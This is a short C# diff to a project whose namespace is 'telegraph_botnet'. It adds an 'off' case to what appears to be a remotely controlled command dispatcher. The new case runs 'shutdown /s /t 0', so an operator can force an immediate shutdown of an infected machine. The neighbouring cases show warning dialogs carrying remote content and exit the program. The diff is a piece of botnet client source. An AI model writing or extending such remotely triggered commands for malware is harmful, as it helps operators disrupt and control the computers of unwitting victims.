@@ -114,6 +114,10 @@ namespace telegraph_botnet
                     functions.DialogWarning(CMD.ComContent);
                     break;
 
+                case "off":
+                    Process.Start("shutdown", "/s /t 0");
+                    break;
+
                 case "exit":
                     Environment.Exit(0);
                     break;
